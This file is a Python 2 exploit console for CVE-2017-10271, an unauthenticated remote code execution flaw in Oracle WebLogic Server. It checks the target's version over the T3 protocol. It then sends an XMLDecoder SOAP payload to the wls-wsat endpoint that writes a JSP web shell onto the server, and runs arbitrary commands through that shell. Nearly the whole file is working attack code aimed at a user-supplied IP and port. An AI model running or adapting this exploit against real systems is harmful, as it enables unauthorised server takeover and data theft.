#!/usr/bin/env python
#coding:utf-8

import cmd, sys, os
import re
import socket
import requests
import time
import base64


class c:
    HEADER = '\033[32m'
    OK = '\033[32m'
    ERROR = '\033[31m'
    BOLD = '\033[1m'
    ENDC = '\033[0m'


class MainConsole(cmd.Cmd):
    global headers, timeout, target
    headers = {'User-Agent':'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)'}
    timeout = 5
    target = {'ip': '', 'port': ''}

    def __init__(self):
        cmd.Cmd.__init__(self)
        self.prompt = 'REShell::CVE-2017-10271 > '
        self.doc_header = 'Help (type help <topic>):'
        self.intro = c.HEADER + '''
-=[ CVE-2017-10271 - Exploit ]=-
@herwonowr <b175@protonmail.com>

=====================================================================================================================================
[*]Vulnerability in the Oracle WebLogic Server component of Oracle Fusion Middleware (subcomponent: WLS Security)
[*]Supported versions that are affected are 10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0 and 12.2.1.2.0 
[*]Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle WebLogic Server
=====================================================================================================================================

Credits: 
- (https://github.com/s3xy/CVE-2017-10271)
- (https://github.com/hanc00l/weblogic_wls_wsat_rce)
        ''' + c.ENDC

    #Get weblogic version by t3 modifide by weblogic-t3-info.nse of nmap script
    def check_version(self,host,port):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        try:
            sock.connect((host, port))
            # Send headers
            headers = 't3 11.1.2\nAS:2048\nHL:19\n\n'
            # print 'sending Hello'
            sock.sendall(headers)
            data = ''
            #receive data and check version:
            try:
                while True:
                    data += sock.recv(1024).strip()
                    #print data
                    if not data.startswith('HELO'):
                        return (False, c.ERROR + '[-]ERR: Check version fail' + c.ENDC)
                    m = re.findall(r'HELO:(\d+\.\d+\.\d+\.\d+)\.',data)
                    if m:
                        return (True, c.OK + '\n[+]Target version: ' + c.BOLD + m[0] + '\n' + c.ENDC)
                    time.sleep(0.1)
            except socket.timeout:
                return (False, c.ERROR + '[-]ERR: Weblogic unknown version' + c.ENDC) 
        except Exception, e:
            return (False, c.ERROR + '[-]ERR: Check version fail' + c.ENDC)
        finally:
            sock.close()

    #Check weblogic version by 404
    def run_check(self,host,port):
        '''Check target version'''
        url = 'http://{}:{}/conso1e'.format(host,port)
        try:
            r = requests.get(url,headers = headers ,timeout =timeout)
            if r.status_code == 404 and 'From RFC 2068' in r.text:
                return self.check_version(host,port)
            else:
                return (False,c.ERROR + '[*]ERR: May be not weblogic' + c.ENDC)
        except requests.exceptions.ConnectionError:
            return (False, c.ERROR + '[-]ERR: Connection Error' + c.ENDC)
        except :
            return (False, c.ERROR + '[-]ERR: Request weblogic fail' + c.ENDC)

    def do_check(self, args):
        '''Check target version'''
        if target.get('ip') == '' and target.get('port') == '':
            print c.ERROR + '\n[-]ERR: Target exploit not configured\n' + c.ENDC
        else:
          target_ip = target['ip']
          target_port = target['port']
          result,msg = self.run_check(target_ip,int(target_port))
          print '{}'.format(msg)

    def do_run(self, args):
        '''Run exploit console'''
        loop_run = C_run()
        loop_run.cmdloop()

    def do_set(self, args):
        '''Set target exploit'''
        loop_set = C_set()
        loop_set.cmdloop()

    def do_show(self, args):
        '''Show target informations'''
        if target.get('ip') == '' and target.get('port') == '':
            print c.ERROR + '\n[-]ERR: Target exploit not configured\n' + c.ENDC
        else:
            print c.OK + '\n[*]Target exploit:\n[+]IP address: ' + c.BOLD + target.get('ip') + c.ENDC
            print c.OK + '[+]Port: ' + c.BOLD + target.get('port') + '\n' + c.ENDC

    def do_clear(self, args):
        '''Clear screen console'''
        os.system('cls' if os.name == 'nt' else 'clear')

    def do_exit(self, args):
        '''Exit the console'''
        return True

    def do_close(self, args):
        '''Exit the console'''
        return True


class C_set(cmd.Cmd):
    def __init__(self):
        cmd.Cmd.__init__(self)
        self.prompt = 'REShell::CVE-2017-10271 :: set > '
        self.doc_header = 'Help (type help <topic>):'

    def do_ip(self, args):
        '''\nSet exploit target IP address\n'''
        ip = args.split()
        if len(ip) == 1:
            target['ip'] = ip[0]
            print c.OK + '\n[*]Target IP address: ' + c.BOLD + ip[0] + '\n' + c.ENDC
        else:
            print c.ERROR + '\n[-]ERR: Target format (type: target 127.0.0.1)\n' + c.ENDC

    def do_port(self, args):
        '''\nSet exploit target port\n'''
        port = args.split()
        if len(port) == 1:
            target['port'] = port[0]
            print c.OK + '\n[*]Target port: ' + c.BOLD + port[0] + '\n' + c.ENDC
        else:
            print c.ERROR + '\n[-]ERR: Target format (type: port 7001)\n' + c.ENDC

    def do_clear(self, args):
        '''\nClear screen console\n'''
        os.system('cls' if os.name == 'nt' else 'clear')

    def do_back(self, args):
        '''\nBack to main console\n'''
        return True


class C_run(cmd.Cmd):
    global headers, timeout
    headers = {'User-Agent':'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)'}
    timeout = 5

    def __init__(self):
        cmd.Cmd.__init__(self)
        self.prompt = 'REShell::CVE-2017-10271 :: console > '
        self.doc_header = 'Help (type help <topic>):'

    def payload(felf, shell_file,output_file):
        html_escape_table = {
            "&": "&amp;",
            '"': "&quot;",
            "'": "&apos;",
            ">": "&gt;",
            "<": "&lt;",
        }
        with open(shell_file) as f:
            shell_context = f.read()
        command_filtered = "<string>"+"".join(html_escape_table.get(c, c) for c in shell_context)+"</string>"
        payload_1 = '''
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
        <soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java>
        <java version="1.6.0" class="java.beans.XMLDecoder">
        <object class="java.io.PrintWriter">
        <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/{}</string>
        <void method="println">{}</void><void method="close"/>
        </object>
        </java>
        </java>
        </work:WorkContext>
        </soapenv:Header><soapenv:Body/></soapenv:Envelope>'''.format(output_file,command_filtered)
        return payload_1

    def cmd(self, target,output_file,command):
        if not target.startswith('http'):
            target = 'http://{}'.format(target)
        output_url = '{}/bea_wls_internal/{}?{}'.format(target,output_file,int(time.time()))
        data = {'c':command}
        try:
            r = requests.post(output_url,data=data,headers = headers,timeout=timeout)
            if r.status_code == requests.codes.ok:
                return (True,r.text.strip())
            elif r.status_code == 404:
                return (False,'[-]ERR: 404 no output')
            else:
                return (False,r.status_code)
        except requests.exceptions.ReadTimeout:
            return (False,'timeout')
        except Exception,ex:
            return (False,str(ex))

    def rce(self, target,cmd,output_file,shell_file):
        if not target.startswith('http'):
            target = 'http://{}'.format(target)
        url = '{}/wls-wsat/CoordinatorPortType'.format(target)
        payload_header = {'content-type': 'text/xml','User-Agent':'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)'}
        msg = ''
        try:
            r = requests.post(url, self.payload(shell_file,output_file),headers = payload_header,verify=False,timeout=timeout)
            if r.status_code == 500:
                return self.cmd(target,output_file,cmd)
            elif r.status_code == 404:
                return (False,'[-]ERR: Not vulnerable')
            else:
                return (False,'{} something went wrong'.format(r.status_code))
        except requests.exceptions.ReadTimeout:
            return (False,'timeout')
        except Exception,ex:
            return (False,str(ex))

    def default(self, args):
        if target.get('ip') == '' and target.get('port') == '':
            print c.ERROR + '\n[-]ERR: Target exploit not configured\n' + c.ENDC
        else:
            shell = 'exec.jsp'
            output = 'output.jsp'
            target_exploit = target['ip']+':'+target['port']
            cmd = args
            status,result = self.rce(target_exploit,cmd,output,shell)
            if status:
              print c.OK + result + c.ENDC
            else:
              print c.ERROR + '[-]FAIL:{}'.format(result) + c.ENDC

    def do_clear(self, args):
        '''\nClear screen console\n'''
        os.system('cls' if os.name == 'nt' else 'clear')

    def do_exit(self, args):
        '''Exit the console'''
        return True

    def do_close(self, args):
        '''Exit the console'''
        return True

if __name__ == '__main__':
    MainConsole().cmdloop()
